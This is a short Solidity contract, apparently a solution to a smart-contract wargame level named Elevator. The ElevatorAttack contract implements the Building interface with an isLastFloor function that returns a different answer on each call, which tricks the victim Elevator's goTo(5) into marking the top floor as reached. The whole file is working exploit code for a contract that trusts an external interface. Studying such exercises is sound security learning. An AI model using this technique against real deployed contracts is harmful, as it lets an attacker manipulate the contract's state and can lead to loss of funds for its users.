// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Elevator.sol";

contract ElevatorAttack is Building{

    Elevator victim;
    bool last = true;

    constructor(address _victim){
        victim = Elevator(_victim);
    }

    function isLastFloor(uint) external returns (bool){
        last = !last;
        return last;
    }

    function attack() external {
        victim.goTo(5);
    }
}